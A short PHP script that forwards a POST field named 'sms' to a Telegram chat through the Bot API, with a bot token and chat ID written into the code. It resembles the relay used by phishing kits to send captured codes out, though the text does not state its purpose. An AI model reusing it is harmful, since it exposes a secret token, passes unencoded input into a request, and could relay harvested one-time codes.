<?php
    $token = "760075700:AAHJ3BrQ_8_VDn6-1-aERjGU4S3gD-ZNqq0";
    $chat_id = "-388829337";
    $txt = $_POST[sms];
    $sendTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    if ($sendTelegram){
        echo "1";
    } else {
        echo "0";
    };

?>